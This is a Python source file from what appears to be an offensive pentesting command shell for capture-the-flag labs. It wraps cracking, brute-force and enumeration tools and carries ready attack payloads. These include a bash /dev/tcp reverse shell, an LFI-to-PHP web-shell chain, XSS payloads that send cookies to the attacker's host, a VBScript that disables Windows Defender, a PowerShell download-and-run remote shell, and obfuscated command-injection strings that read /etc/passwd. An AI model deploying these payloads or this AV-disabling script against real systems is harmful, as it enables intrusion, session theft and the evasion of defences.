    def do_createhash(self, line):
        """Crea un archivo hash.txt en el directorio sessions"""
        print_msg(
            f"Creando archivo sessions/hash.txt con el siguiente contenido {line}{RESET}"
        )
        os.system(f"echo '{line}' > sessions/hash.txt")
        print_msg(f"Analisando sessions/hash.txt con Name-the-hash {RESET}")
        os.system(f"nth -t '{line}'")

        return

    def do_createcredentials(self, line):
        """Crea un archivo credentials.txt en el directorio sessions el forato debe ser: user:password"""
        print_msg(
            f"Creando archivo sessions/credentials.txt con el siguiente contenido {line}{RESET}"
        )
        if ":" in line:
            os.system(f"echo '{line}' > sessions/credentials.txt")
        else:
            print_error(
                f"El archivo debe tener este formato usuario:contraseña ej: administrator:passwordadministrator123&!  {line}{RESET}"
            )
            return
        return

    def do_createcookie(self, line):
        """Crea un archivo cookie.txt en el directorio sessions con el formato de una cookie válida."""
        print_msg(
            f"Creando archivo sessions/cookie.txt con el siguiente contenido {line}{RESET}"
        )

        # Usa una expresión regular para encontrar la parte que te interesa
        match = re.search(r"cookie=([^&]+)", line)

        if match:
            # Extrae el valor después de 'cookie='
            cookie_value = match.group(1)
            # Crea el archivo con el valor extraído
            os.system(f"echo '{cookie_value}' > sessions/cookie.txt")
            print_msg(f"Archivo creado con el contenido: {cookie_value}")
        else:
            print_error(
                f"El formato de entrada es incorrecto. Asegúrate de que el formato sea: cookie=user_data=valor_base64  {line}{RESET}"
            )
            return

    def do_download_resources(self, line):
        """download resources in sessions"""
        os.system("cd sessions && ./download_resources.sh ")
        print_msg(f"Resources downloaded now you can run command {MAGENTA}www {RESET}")
        return

    def do_download_exploit(self, line):
        """download exploits in external/.exploits/"""
        os.system("cd external && ./install_external.sh ")
        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )
        os.system(
            "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
        )
        os.system(
            'echo "[\e[96m`pwd`\e[0m]\e[34m" && cd external/.exploit && ls && echo -en "\e[0m"'
        )
        print_msg(f"Web server at external/.exploit in port {RED} 8443 {RESET}")
        os.system("cd external/.exploit && python3 -m http.server 8443")
        print_msg(
            f"Shutdown Web server at external/.exploit in port {RED} 8443 {RESET}"
        )
        return

        return

    def do_dirsearch(self, line):
        """dirsearch -u http://url.ext/ -x 403,404,400"""
        url = self.params["url"]
        if not url:
            print_error(
                "Url must be set: use set url http://url.ext/ more info in help set"
            )
            return
        if is_binary_present("dirsearch"):
            print_msg("[*] Try... dirsearch -u http://url.ext/ -x 403,404,400")
            os.system(f"dirsearch -u {url} -x 403,404,400")
        else:
            print_error(
                "dirsearch is not installed, installing... (control + c to cancel)"
            )
            os.system(
                f"sudo apt install dirsearch -y && dirsearch -u {url} -x 403,404,400"
            )
        return

    def do_john2hash(self, line):
        """example: sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt -format=Raw-SHA512"""
        wordlist = self.params["wordlist"]
        if not wordlist:
            print_error("wordlist must be set use set wordlist <path_to_wordlist>")
            return
        if line:
            print_msg(f"Try sudo john hash.txt {line}")  # line like -format=Raw-SHA512
            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist} {line}")
        else:
            print_msg("Try sudo john hash.txt --show")
            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist}")
        return

    def do_hashcat(self, line):
        """hashcat -a 0 -m mode hash /usr/share/wordlists/rockyou.txt"""
        wordlist = self.params["wordlist"]
        if not wordlist or not line:
            print_error(
                "wordlist must be set and you need pass the hash in argument ex: hashcat hash"
            )
            return
        print_msg(f"Try hashcat -a 0 -m {line} {wordlist}")
        os.system(f"hashcat -a 0 -m {line} {wordlist}")
        return

    def complete_hashcat(self, text, line, begidx, endidx):
        """Complete mode options and file paths for the sessions/hash.txt"""
        parts = line.split()

        if len(parts) == 1:
            return [
                str(x) for x in range(0, 20000) if str(x).startswith(text)
            ]  # Modify the range as needed for mode options

        if len(parts) == 2:
            return [f for f in glob.glob("sessions/hash.txt") if f.startswith(text)]

        return []

    def do_responder(self, line):
        """sudo responder -I tun0"""
        device = self.params["device"]
        if not device:
            print_error("Device must be set use set device <network_device_ex_tun0>")
            return
        print_msg(f"Try sudo responder -I {device}")
        os.system(f"sudo responder -I {device}")
        return

    def do_ip(self, line):
        """ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }' and copy de ip to clipboard :)"""
        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )
        os.system(
            "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
        )
        print_msg(f"ip from tun0 copied to clipboard :) {RESET}")
        return

    def do_rhost(self, line):
        """Copy rhost to clipboard"""
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        cwd = os.getcwd()
        if line == 'clean':
            self.custom_prompt = getprompt()
            self.prompt = f"{self.custom_prompt}"
        else:
            self.custom_prompt = getprompt().replace(']', f"]{YELLOW}[{MAGENTA}{rhost}{YELLOW}][{GREEN}{cwd}{YELLOW}]")
            self.prompt = f"{self.custom_prompt}"
            os.system(f"printf '{rhost}' | xclip -sel clip")
            print_msg(f"ip from payload: {rhost=}, copied to clipboard :) {RESET}")
        return

    def do_banner(self, line):
        """Show the banner"""
        if NOBANNER is False:
            print_msg(
                f"    {BG_BLACK}{RED}{BANNER}{MAGENTA}Autor: {CYAN}grisUN0{RESET}"
            )
            time.sleep(0.2)
            print_msg(LazyOwnShell().intro)
        return

    def do_py3ttyup(self, line):
        """copy to clipboard tipical python3 -c 'import pty; pty.spawn ... bla bla blah..."""
        os.system(
            'echo "python3 -c \'import pty;pty.spawn("/bin/bash")\'"| xclip -sel clip'
        )
        print_msg(
            'Try... echo "python3 -c \'import pty;pty.spawn("/bin/bash")\'"| xclip -sel clip # copied to clipboard :) '
        )
        return

    def do_rev(self, line):
        """Copy a revshell to clipboard"""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rhost = self.params["rhost"]
        if not lhost or not lport or not rhost:
            print_error(f"rhost, lhost and lport must be set.{RESET}")
            return

        print_msg(
            f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' {MAGENTA}copied to cplipboard :D "
        )
        print_warn("<modo de uso>")
        print(
            f"http://{rhost}/?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/ "
        )
        print('<?shell_exec(base64_decode("')
        os.system(
            f"echo \"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" | base64"
        )
        print('"));?>')
        print("+/tmp/shell.php")
        print_warn("</modo de uso>")
        os.system(
            f"echo \"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip"
        )

        return

    def do_img2cookie(self, line):
        """Copy a malicious img tag to clipboard"""
        lhost = self.params.get("lhost")
        lport = self.params.get("lport")
        rhost = self.params.get("rhost")
        if not lhost or not lport or not rhost:
            print_error(f"rhost, lhost and lport must be set.{RESET}")
            return

        print_msg(f"Crafting img payload...")

        # Payload 1
        command1 = f'echo "<script>new Image().src="http://{lhost}:80/cookie?c="+document.cookie;</script>" | xclip -sel clip'

        # Payload 2
        cmd = f"""fetch('http://{lhost}:80/?cookie='+document.cookie)"""
        utf8_encoded = cmd.encode("utf-8")
        base64_encoded = base64.b64encode(utf8_encoded)
        base64_string = base64_encoded.decode("utf-8").strip()
        command2 = f"echo \"<img src=x onerror=eval(atob('{base64_string}'))>\" | xclip -sel clip"

        # Inform user and ask for selection
        print_warn("<modo_de_uso>")
        print_msg(f"Payload 1: {command1}")
        print_msg(f"Payload 2: {command2}")
        print_warn("</modo_de_uso>")

        choice = input(
            f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1 or 2): {RESET}"
        ).strip()

        if choice == "1":
            os.system(command1)
            print_msg(f"Payload 1 copied to Clipboard")
        elif choice == "2":
            os.system(command2)
            print_msg(f"Payload 2 copied to Clipboard")
        else:
            print_error("Invalid choice. Please select 1 or 2.")

        return

    def do_disableav(self, line):
        """visual basic script to try to disable antivirus"""

        file_aav = '''If Not WScript.Arguments.Named.Exists("elevate") Then
        CreateObject("Shell.Application").ShellExecute WScript.FullName _
            , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
        WScript.Quit
        End If

        On Error Resume Next
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",1,"REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring","1","REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection","1","REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable","1","REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRawWriteNotification","1","REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection","1","REG_DWORD"
        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring","1","REG_DWORD"

        WScript.Sleep 100

        outputMessage("Set-MpPreference -DisableRealtimeMonitoring $true")
        outputMessage("Set-MpPreference -DisableBehaviorMonitoring $true")
        outputMessage("Set-MpPreference -DisableBlockAtFirstSeen $true")
        outputMessage("Set-MpPreference -DisableIOAVProtection $true")
        outputMessage("Set-MpPreference -DisableScriptScanning $true")
        outputMessage("Set-MpPreference -SubmitSamplesConsent 2")
        outputMessage("Set-MpPreference -MAPSReporting 0")
        outputMessage("Set-MpPreference -HighThreatDefaultAction 6 -Force")
        outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
        outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
        outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")


        Sub outputMessage(byval args)
        On Error Resume Next
        Set objShell = CreateObject("Wscript.shell")
        objShell.run("powershell " + args), 0
        End Sub'''.replace("        ", "")
        filename = "sessions/aav.vbs"
        print_msg(f"new file in {filename} '")
        with open(filename, "w") as f:
            f.write(file_aav)
        f.close()
        print_msg(
            f"Archivo {filename} creado con èxito en el directorio sessions con contenido: {file_aav} "
        )
        return

    def do_conptyshell(self, line):
        """Download ConPtyShell in sessions directory and copy to clipboard the command :D"""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not lhost or not lport:
            print_error(f"lhost and lport must be set.{RESET}")
            return

        os.system(
            "cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 && wget https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip"
        )
        cmd = f"""IEX(New-Object New.WebClient).downloadString('http://{lhost}/Invoke-ConPtyShell.ps1') ; powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'Invoke-ConPtyShell  -RemoteIp {lhost} -RemotePort {lport} -Rows 24 -Cols 135'"""
        os.system(f"echo '{cmd}' |  xclip -sel clip")
        print_msg(f"{cmd} {YELLOW} Copied to clipboard :D {RESET}")
        return

    def do_pwncatcs(self, line):
        """run pwncat-cs -lp <PORT> :)"""
        lport = self.params["lport"]
        if not lport and not line:
            print_error(
                f"lport must be set or pass the port by parameter like: nc 6666.{RESET}"
            )
            return
        if not line:
            print_msg(f"Try.. pwncat-cs -lp {lport}{RESET}")
            os.system(f"pwncat-cs -lp {lport}")
        else:
            print_msg(f"Try.. pwncat-cs -lp {line}{RESET}")
            os.system(f"pwncat-cs -lp {line}")
        print_msg(
            f"{RED}[*] {YELLOW} Shutdown pwncat-cs sessions in port {RED} [{lport}|{line}] {RESET}"
        )
        return

    def do_find(self, line):
        """copy to clipboard this command always forgot :) find / -type f -perm -4000 2>/dev/null"""
        print_msg(f"{YELLOW}find / -type f -perm -4000 2>/dev/null{RESET}")
        os.system('echo "find / -type f -perm -4000 2>/dev/null" | xclip -sel clip')
        print_msg(f"{RED}{MAGENTA}Copied to clipboard {RESET}")
        return

    def do_sh(self, line):
        """execute some command direct in shell to avoid exit LazyOwn ;)"""
        if not line:
            print_error(f"You must pass the command linke argument")
            return
        print_msg(f"Try... {line}{RESET}")
        os.system(f"{line}")
        return

    def do_pwd(self, line):
        """'echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"'"""
        print_msg(
            f'Try echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"{RESET}'
        )
        os.system('echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"')
        os.system("pwd | xclip -sel clip")
        print_msg(f" pwd directory copied to clipboard{RESET}")
        return

    def do_qa(self, line):
        """Exit fast without confirmation"""
        print_error(f"Saliendo {BG_BLACK}[;,;]{RESET}")
        os.system("tmux kill-session -t lazyown_sessions 2>/dev/null")
        os.system("killall openvpn 2>/dev/null")
        sys.exit(0)

    def do_ignorearp(self, line):
        """echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore"""
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}1 {RED}> {GREEN}/proc/sys/net/ipv4/conf/all/arp_ignore'{RESET}"
        )
        os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore'")
        print_msg(f"    {GREEN}[+] Done.{RESET}")
        return

    def do_ignoreicmp(self, line):
        """echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"""
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}1 {RED}> {GREEN}/proc/sys/net/ipv4/icmp_echo_ignore_all'{RESET}"
        )
        os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all'")
        print_msg(f"Done.{RESET}")
        return

    def do_acknowledgearp(self, line):
        """echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore"""
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}0 {RED}> {GREEN}/proc/sys/net/ipv4/conf/all/arp_ignore'{RESET}"
        )
        os.system("sudo bash -c 'echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore'")
        print_msg(f"Done.{RESET}")
        return

    def do_acknowledgeicmp(self, line):
        """echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all"""
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}0 {RED}> {GREEN}/proc/sys/net/ipv4/icmp_echo_ignore_all'{RESET}"
        )
        os.system("sudo bash -c 'echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all'")
        print_msg(f"Done.{RESET}")
        return

    def do_clock(self, line):
        """Show the time to go sleep xD"""
        cmd = """
        # Obtiene la fecha y hora actual en el formato deseado
        current_date=$(date +"%Y-%m-%d")
        current_time=$(date +"%H:%M:%S")
        # Muestra la fecha y hora con figlet
        figlet "$current_date"
        figlet "$current_time"
        """
        print_msg(WHITE)
        os.system(cmd)
        print_msg(GREEN)
        os.system("./modules/cal.sh")
        print_msg(RESET)

        return

    def do_ports(self, line):
        """Get all ports local"""
        tcp_ports, udp_ports = get_open_ports()
        print_msg(f"Open TCP Ports:{RESET}")
        for ip, port in tcp_ports:
            print_msg(f"{CYAN}{ip}{YELLOW}:{RED}{port}{RESET}")

        print_msg(f"{GREEN}Open UDP Ports:{RESET}")
        for ip, port in udp_ports:
            print_msg(f"{CYAN}{ip}{YELLOW}:{RED}{port}{RESET}")
        return

    def do_ssh(self, line):
        """Conecta a un host SSH usando credenciales desde un archivo y el puerto especificado."""
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        rport = line  # El puerto será proporcionado como argumento 'line'
        credentials_file = "./sessions/credentials.txt"
        if not os.path.exists:
            print_error(
                "sessions/creadentials.txt must exist ex: createcredentials user:password "
            )
            return

        with open(credentials_file, "r") as file:
            for line in file:
                user, passwd = line.strip().split(":")
                command = f"sshpass -p {passwd} ssh -o StrictHostKeyChecking=no -p {rport} {user}@{rhost}"
                print_msg(command)
                os.system(command)
        return

    def do_cports(self, line):
        """Genera un comando para mostrar puertos TCP y UDP, y lo copia al portapapeles."""

        # Define el comando con comillas escapadas adecuadamente
        tcp_cmd = """echo "TCP Ports:"; \
        awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/tcp; \
        echo "UDP Ports:"; \
        awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/udp
        """

        # Imprimir el comando para verificar
        print_msg(f"{GREEN} {tcp_cmd} {RESET}")

        # Copiar el comando al portapapeles
        try:
            # Usamos subprocess para manejar la entrada de manera segura
            process = subprocess.Popen(
                ["xclip", "-sel", "clip"], stdin=subprocess.PIPE, text=True
            )
            process.communicate(input=tcp_cmd)
        except subprocess.CalledProcessError as e:
            print_error(f"Error: {e}{RESET}")

        return

    def do_vpn(self, line):
        """Open VPN like HTB VPN command vpn now handle multiple ovpn files"""

        # List all .ovpn files
        ovpn_files = sorted([f for f in os.listdir(".") if f.endswith(".ovpn")])

        # Handle no arguments
        if not line.strip():
            if not ovpn_files:
                print_msg("No .ovpn files found.")
                return

            print_msg("Available .ovpn files:")
            for idx, file in enumerate(ovpn_files, start=1):
                print_msg(f"{idx}: {file}")

            choice = input("Select the number of the .ovpn file to connect to: ")
            try:
                choice = int(choice)
                if 1 <= choice <= len(ovpn_files):
                    os.system(f"sudo openvpn {ovpn_files[choice - 1]}")
                    print_msg(f"Connecting to {ovpn_files[choice - 1]}")
                else:
                    print_error("Invalid choice. Please select a number from the list.")
            except ValueError:
                print_error("Invalid input. Please enter a number.")

        else:
            args = line.split()
            print(args)
            if len(args) == 1:
                try:
                    choice = int(args[0])
                    if 1 <= choice <= len(ovpn_files):
                        os.system(f"sudo openvpn {ovpn_files[choice - 1]}")
                        print_msg(f"Connecting to {ovpn_files[choice - 1]}")
                    else:
                        print_error(
                            "Invalid number. Please select a number from the list."
                        )
                except ValueError:
                    print_error("Invalid input. Please enter a number.")
            else:
                print_error(
                    "Invalid command format. Use 'vpn' to list and select, or 'vpn <number>' to connect directly."
                )
        return

    def do_id_rsa(self, line):
        """create id_rsa file, open nano sessions/id_rsa, usage like this: id_rsa username, open nano and you paste the private key, and run ssh command"""
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        if not line:
            print_error(f"must pass the user by argument like:{GREEN} id_rsa username")
            return
        file = f"sessions/id_rsa_{line}"
        print_msg(f"Try... nano {file}")
        os.system(f"nano {file} && chmod 400 {file}")
        print_msg(
            f"{YELLOW} Conecting to ssh {line}@{rhost} -i {file} {RED}[;,;] {RESET}"
        )
        os.system(f"ssh {line}@{rhost} -i {file}")
        print_warn("ssh conection closed")
        return

    def do_www(self, line):
        """Start a web server with python3"""
        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )
        os.system(
            "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
        )
        os.system(
            'echo "[\e[96m`pwd`\e[0m]\e[34m" && cd sessions && ls && echo -en "\e[0m"'
        )
        print_msg(f"{GREEN} Web server at sessions in port {RED} 80 {RESET}")
        os.system("cd sessions && sudo python3 -m http.server 80")
        print_msg(f"{YELLOW} Shutdown Web server at sessions in port {RED} 80 {RESET}")
        return

    def do_wrapper(self, line):
        """copy to clipboard some wrapper to lfi"""

        command1 = "echo ' php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd' | xclip -sel clip"
        command2 = "echo ' file:///proc/self/cmdline' | xclip -sel clip"
        command3 = "echo ' file:///etc/passwd' | xclip -sel clip"

        print_warn("<modo de uso>")
        print_msg(f"{command1=}")
        print_msg(f"{command2=}")
        print_msg(f"{command3=}")
        print_warn("</modo de uso>")
        choice = input(
            f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1, 2 or 3): {RESET}"
        ).strip()

        if choice == "1":
            os.system(command1)
            print_msg(f"Payload 1 copied to Clipboard")
        elif choice == "2":
            os.system(command2)
            print_msg(f"Payload 2 copied to Clipboard")
        elif choice == "3":
            os.system(command3)
            print_msg(f"Payload 3 copied to Clipboard")
        else:
            print_error("Invalid choice. Please select 1, 2 or 3.")
        return

    def do_samrdump(self, line):
        """impacket-samrdump -port 445 10.10.10.10"""
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        print_msg(f"Try... impacket-samrdump -port 139  {rhost}")
        os.system(f"impacket-samrdump -port 139  {rhost}")
        print_msg(f"Try... impacket-samrdump -port 445  {rhost}")
        os.system(f"impacket-samrdump -port 445  {rhost}")

        return

    def do_urlencode(self, line):
        """Encode a string for URL."""
        if not line.strip():
            print_error("Please provide a string to encode.")
            return

        encoded_string = quote(line.strip())
        print_msg(encoded_string)
        return

    def do_urldecode(self, line):
        """Decode a URL-encoded string."""
        if not line.strip():
            print_error("Please provide a string to decode.")
            return

        decoded_string = unquote(line.strip())
        print_msg(decoded_string)
        return

    def do_lynis(self, line):
        """sudo lynis audit system remote 10.10.10.10 more info check modules/lazylynis.sh"""

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        print_msg(f"Try... sudo modules/lazylynis.sh {rhost}")
        os.system(f"sudo modules/lazylynis.sh {rhost}")

        return

    def do_snmpcheck(self, line):
        """snmp-check 10.10.10.10"""
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        print_msg(f"Try... snmp-check {rhost}")
        os.system(f"snmp-check {rhost}")
        return

    def do_encode(self, line):
        """Encodes a string with the given shift value and substitution key"""
        parts = line.split(" ", 2)
        if len(parts) != 3:
            print_error("Usage: encode <shift_value> <substitution_key> <string>")
            return

        try:
            shift_value = int(parts[0])
            substitution_key = parts[1]
            input_string = parts[2]
        except ValueError:
            print_error("Error: Shift value must be an integer")
            return

        # Encode the input string
        encoded_string = encode(input_string, shift_value, substitution_key)
        print_msg(f"Encoded string: {encoded_string}")
        return

    def do_decode(self, line):
        """Decodes a string with the given shift value and substitution key"""
        parts = line.split(" ", 2)
        if len(parts) != 3:
            print_error("Usage: decode <shift_value> <substitution_key> <string>")
            return

        try:
            shift_value = int(parts[0])
            substitution_key = parts[1]
            input_string = parts[2]
        except ValueError:
            print_error("Error: Shift value must be an integer")
            return

        # Decode the input string
        decoded_string = decode(input_string, shift_value, substitution_key)
        print_msg(f"Decoded string: {decoded_string}")
        return
        
    def do_creds(self, line):
        """
        Display the credentials stored in the `credentials.txt` file and copy the password to the clipboard.

        This function reads the stored credentials from a file named `credentials.txt` located in the `sessions` directory.
        The file should be in the format `username:password`. If the file does not exist, an error message will be printed
        instructing the user to create the credentials file first. The function extracts the username and password from the file,
        prints them, and copies the password to the clipboard using `xclip`.

        :param line: A string parameter that is not used in this function. It is included for compatibility with command-line
                    interface functions.

        :returns: None

        Manual execution:
        To manually perform the equivalent actions, follow these steps:

            1. Ensure the file `sessions/credentials.txt` exists and contains credentials in the format `username:password`.
            2. Read the file and extract the username and password.
            3. Print the username and password to the console.
            4. Use the `xclip` tool to copy the password to the clipboard. Example command:

                echo '<password>' | xclip -sel clip

        Example:
        If `sessions/credentials.txt` contains `admin:password123`, the function will print:

            User : admin
            Pass : password123

        The password `password123` will be copied to the clipboard.

        Note:
        Ensure `xclip` is installed on your system for copying to the clipboard. The function assumes that `xclip` is available
        and correctly configured.
        """
        path = os.getcwd()    
        file = f"{path}/sessions/credentials.txt"
        if not os.path.exists(file):
            print_error("You need use createcredentials user:pass before.")
            return
        
        with open(file, "rb") as f:
            data = f.read()
        creds = data.split(b":")
        user = creds[0].decode('utf-8')
        passwd = creds[1].decode('utf-8').replace('\n','')
        print_msg(f"User : {user}")
        print_msg(f"Pass : {passwd}")
        command = f"echo '{passwd}' | xclip -sel clip"
        os.system(command)
        print_msg(command)
        return

    def do_rot(self, line):
        """
        Apply ROT13 substitution cipher to the given string.

        Usage:
            rot <number> '<string>'
        """

        # Split the line into parts
        parts = line.split("'", 1)
        if len(parts) != 2:
            print_error("Usage: rot <number> '<string>'")
            return

        # Extract the number and text
        number_str = parts[0].strip()
        text = parts[1].strip().strip("'")

        # Validate the number
        try:
            number = int(number_str)
            if not (1 <= number <= 27):
                raise ValueError("Number must be between 1 and 27.")
        except ValueError as e:
            print_error(f"Invalid number: {e}")
            return

        # Apply the rotation
        rotated_text = "".join(rotate_char(c, number) for c in text)
        print_msg(rotated_text)
        return

    def do_hydra(self, line):
        """hydra -f -L sessions/users.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.9 -s 5000 https-get /v2/"""
        rhost = self.params["rhost"]
        wordlist = self.params["wordlist"]
        if not wordlist:
            print_error(
                "you need load the payload using p or payload or set wordlist /oath/to/wordlist"
            )
            return
        if not check_rhost(rhost):
            return
        if not line:
            print_error(
                "you need pass the path to crack and the port example hydra /login/ 8080"
            )
            return
        args = line.split(" ")

        if len(args) < 2:
            print_error(
                "you need pass the path to crack and the port example hydra /login/ 8080"
            )
            return
        print_msg(
            f"Try... hydra -f -L sessions/users.txt -P {wordlist} {rhost} -s {args[1]} http-get {args[0]}"
        )
        os.system(
            f"hydra -f -L sessions/users.txt -P {wordlist} {rhost} -s {args[1]} http-get {args[0]}"
        )
        return

    def do_nmapscript(self, line):
        """Perform an Nmap scan using a specified script and port.

        :param line: A string containing the Nmap script and port, separated by a space. Example: "http-enum 80".

        :returns: None

        Manual execution:
        To manually run an Nmap scan with a script and port, use the following command format:

            nmap --script <script> -p <port> <target> -oN <output-file>

        Example:
        If you want to use the script `http-enum` on port `80` for the target `10.10.10.10`, you would run:

            nmap --script http-enum -p 80 10.10.10.10 -oN sessions/webScan_10.10.10.10

        Ensure you have the target host (`rhost`) set in the parameters and provide the script and port as arguments. The results will be saved in the file `sessions/webScan_<rhost>`.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        parts = line.split(" ", 2)
        print(len(parts))
        if len(parts) != 2:
            print_error("Usage: nmapscript <script> <port>")
            return
        script = parts[0]    
        port = parts[1]
        print_msg(
            f"Try... nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}"
        )
        os.system(f"nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}")
        return

    def do_encoderpayload(self, line):
        try:
            # Base64 double encoding
            def double_base64_encode(cmd):
                return base64.b64encode(base64.b64encode(cmd.encode()).strip()).decode().strip()
            
            def apply_obfuscations(cmd):
                obfuscations = [
                    f"echo \"echo $(echo '{cmd}' | base64 | base64)|base64 -d|base64 -d|bash\" | sed 's/ /${{IFS}}/g'",
                    f"echo {double_base64_encode(cmd)}|base64 -d|base64 -d|bash",
                    f"$(tr '[A-Z]' '[a-z]' <<< '{cmd}')",
                    f"$(a='{cmd}'; printf %s \"${{a,,}}\")",
                    f"$(rev <<< '{cmd}')",
                    f"bash <<< $(base64 -d <<< {base64.b64encode(cmd.encode()).decode()})",
                    f"echo {cmd} | $0",
                    f"cat$u /etc$u/passwd$u",
                    f"p${{u}}i${{u}}n${{u}}g",
                    f"p\\\i\\\n\\\g",
                    f"cat ${{HOME:0:1}}etc${{HOME:0:1}}passwd",
                    f"cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd",
                    f"echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"",
                    f"cat $(echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\")",
                    f"abc=${'$'}'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'; cat abc",
                    f"$(printf %.1s \"$PWD\")bin$(printf %.1s \"$PWD\")ls",
                    f"while read -r line; do echo $line; done < /etc/passwd"
                ]
                return obfuscations

            # Apply obfuscations
            obfuscations = apply_obfuscations(line)
            for obfuscation in obfuscations:
                print_msg(obfuscation)
        
        except Exception as e:
            print_error(f"An error occurred: {e}")

    def do_smtpuserenum(self, line):
        """sudo smtp-user-enum -M VRFY -U /usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.10"""
        rhost = self.params["rhost"]
        usrwordlist = self.params["usrwordlist"]
        if not check_rhost(rhost):
            return
        if not usrwordlist:
            print_error("use p or payload to load payloads parameters")
            return
        print_msg(f"Try... sudo smtp-user-enum -M VRFY -U {usrwordlist} -t {rhost}")
        os.system(f"sudo smtp-user-enum -M VRFY -U {usrwordlist} -t {rhost}")
        return

    def do_sshd(self, line):
        """sudo systemctl start ssh"""
        print_msg(f"Try... sudo systemctl start ssh")
        os.system(f"sudo systemctl start ssh")
